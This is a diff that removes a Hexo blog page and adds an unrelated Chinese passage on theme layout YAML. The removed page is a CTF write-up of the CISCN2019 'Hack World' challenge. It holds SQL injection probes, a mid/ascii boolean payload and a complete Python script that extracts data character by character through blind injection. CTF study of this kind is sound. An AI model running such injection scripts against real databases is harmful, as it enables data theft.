@@ -1,211 +1,29 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
-  
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="CISCN2019 华北赛区 Day2 Web1 Hack Worldbool盲注![[Pasted image 20250428142849.png]] 尝试解题有输入框，先尝试了sql注入输入1，2有不同回显，输入其他数字报错，推测只是数据库有存储关于id&#x3D;1，2的数据。![[Pasted image 20250428143100.png]]![[Pasted image 20250">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/2025/05/08/Hack%20World%20bool%E7%9B%B2%E6%B3%A8/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="CISCN2019 华北赛区 Day2 Web1 Hack Worldbool盲注![[Pasted image 20250428142849.png]] 尝试解题有输入框，先尝试了sql注入输入1，2有不同回显，输入其他数字报错，推测只是数据库有存储关于id&#x3D;1，2的数据。![[Pasted image 20250428143100.png]]![[Pasted image 20250">
-<meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2025-05-08T02:32:10.865Z">
-<meta property="article:modified_time" content="2025-05-08T02:31:05.554Z">
-<meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-  
-<link rel="stylesheet" href="/css/style.css">
-
-  
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
-
-  
-  
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
-
-<meta name="generator" content="Hexo 7.3.0"></head>
-
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-
-      <div class="outer">
-        <section id="main"><article id="post-Hack World bool盲注" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/08/Hack%20World%20bool%E7%9B%B2%E6%B3%A8/" class="article-date">
-  <time class="dt-published" datetime="2025-05-08T02:32:10.865Z" itemprop="datePublished">2025-05-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="CISCN2019 华北赛区 Day2 Web1 Hack World"></a>CISCN2019 华北赛区 Day2 Web1 Hack World</h3><h4 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h4><p>![[Pasted image 20250428142849.png]]</p>
-<h4 id="尝试解题"><a href="#尝试解题" class="headerlink" title="尝试解题"></a>尝试解题</h4><p>有输入框，先尝试了sql注入<br>输入1，2有不同回显，输入其他数字报错，推测只是数据库有存储关于id&#x3D;1，2的数据。<br>![[Pasted image 20250428143100.png]]<br>![[Pasted image 20250428143043.png]]<br>开始判断闭合类型<br>[^1]![[Pasted image 20250428143243.png]]<br>这里显示了bool类型错误，不知道什么原因</p>
-<p>尝试万能密码<br><code>1&#39; or 1=1</code><br>![[Pasted image 20250428143307.png]]<br>尝试万能密码显示sql注入被限制，解题就到这。</p>
-<h4 id="查看wp"><a href="#查看wp" class="headerlink" title="查看wp"></a>查看wp</h4><p>看了wp得知，根据bool(false)的回显可以判断最可能为数字型注入<br><strong>这里先补充关于回显false和error的区别</strong><br>false说明语句存在逻辑错误 例如1 AND 1&#x3D;2<br>error说明sql语句存在语法错误</p>
-<p>这题数字型注入没报错的可能原因：id&#x3D;1’被隐式转换成id&#x3D;1.<br>如果是其他题，没有对sql注入相关字符过滤的话，可以使用1 AND 1&#x3D;1进一步根据回显判断注入类型</p>
-<p>也可能是字符型注入，其’引号被过滤或者转义所以没报错</p>
-<p>根据wp，<strong>bool(false)是进行盲注的标志，如果回显错误信息，可以考虑报错注入</strong></p>
-<p><strong>这题有一个提示，表名和列名都是flag，可以用于构造盲注</strong></p>
-<p><strong>1.使用mid函数</strong><br><code>payload = &#39;(select(ascii(mid(flag,&#123;0&#125;,1))=&#123;1&#125;)from(flag))&#39;.format(num,ord(i))</code><br>这里format用于给前面的sql语句传参，num和ord(i)分别传给{0}，{1}位置<br>mid用于截取flag字段，从第{0}位截取1位<br>ascii用于将该字符转为ascii码<br>这段sql语句意思：将flag的第{0}位取出并转为ascii码</p>
-<p>完整脚本：<br><code>import requests</code><br><code>import string</code></p>
-<p><code>def blind_injection(url):</code><br>    <code>flag = &#39;&#39;</code><br>    <code>strings = string.printable</code><br>    <code>for num in range(1,60):</code><br>        <code>for i in strings:</code><br>            <code>payload = &#39;(select(ascii(mid(flag,&#123;0&#125;,1))=&#123;1&#125;)from(flag))&#39;.format(num,ord(i))</code><br>            <code>post_data = &#123;&quot;id&quot;:payload&#125;</code><br>            <code>res = requests.post(url=url,data=post_data)</code><br>            <code>if &#39;Hello&#39; in res.text:</code><br>                <code>flag += i</code><br>                <code>print(flag)</code><br>            <code>else:</code><br>                <code>continue</code><br>    <code>print(flag)</code><br><code>if __name__ == &#39;__main__&#39;:</code><br>    <code>url = &#39;http://243ea492-28a9-45db-b5fe-f9c61c04ecc4.node5.buuoj.cn:81/index.php&#39;</code><br>    <code>blind_injection(url)</code></p>
-<p>核心思想就是通过将未知的flag每一位与可打印字符串每一位遍历，根据POST参数的回显信息判断是否相等，相等则记录，然后获取下一位</p>
-<h4 id="2-使用-substr"><a href="#2-使用-substr" class="headerlink" title="2.使用^+substr"></a>2.使用^+substr</h4><h4 id="3-使用sql三目运算"><a href="#3-使用sql三目运算" class="headerlink" title="3.使用sql三目运算"></a>3.使用sql三目运算</h4><h4 id="大致思路都是逐位判断获取字符"><a href="#大致思路都是逐位判断获取字符" class="headerlink" title="大致思路都是逐位判断获取字符"></a>大致思路都是逐位判断获取字符</h4><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>盲注的判断标志bool(false)<br>盲注的解题流程：获取数据库，表，字段，最后进行逐位判断获取flag</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/08/Hack%20World%20bool%E7%9B%B2%E6%B3%A8/" data-id="cmaer55oe0000jgu13otlf7aq" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-    
-<nav id="article-nav">
-  
-  
-    <a href="/2025/05/08/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">Hello World</div>
-    </a>
-  
-</nav>
-
-  
-</article>
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-
-  
-    
-
-  
-    
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">May 2025</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2025/05/08/Hack%20World%20bool%E7%9B%B2%E6%B3%A8/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2025/05/08/hello-world/">Hello World</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2025 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-
-<script src="/js/jquery-3.6.4.min.js"></script>
-
-
-
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-
-  </div>
-</body>
-</html>
+<p>您可以自由决定每个页面是否显示侧边栏，侧边栏显示什么小部件，正文区域显示什么卡片，文章卡片显示什么 meta 信息。</p>
+<pre><code class="yaml">layout:
+  # The following can be written in `blog/source/_data/layout.yml`
+  # 文章列表（主页、自定义的列表）布局
+  on_list:
+    # 列表中每一篇文章的meta信息
+    meta: [title, author, date, category, top]
+    # 列表类页面的侧边栏
+    sidebar: [blogger, category, tagcloud, qrcode]
+  # 页面布局
+  on_page:
+    # 文章页面主体元素，你也可以在页面的Front-matter中设置
+    body: [article, comments]
+    # 默认的meta信息，文章中没有配置则按照这里的配置来显示，设置为false则不显示
+    # 其中，title只在header中有效，music和thumbnail无需在这里设置，文章中有则显示
+    # 如果tags放置在meta.header中，那么在post列表中不显示（因为卡片下方已经有了）
+    meta:
+      header: [title, author, category, date, top]
+      footer: [updated, tags, btns, share]
+    # 文章页面的侧边栏
+    sidebar: [qrcode, toc]
+  # 文章布局，参数继承自 on_page
+  on_post:
+    # 文章页脚，自动在每一篇文章末尾添加
+    article_footer: [copyright, donate]
+  # 其他的页面布局暂时等于 on_list
+</code></pre>
+<p>其中 <code>meta</code> 部分的取值自 <code>meta</code> 库， 其余部分取值自 <code>widget</code> 库， （ <code>body</code> 除了可以从 <code>widget</code> 库中取值外，还可以选择 <code>article</code> 和 <code>comments</code> ）。</p>
+<p>请别着急，具体的库配置将在下文详细讲解。</p>
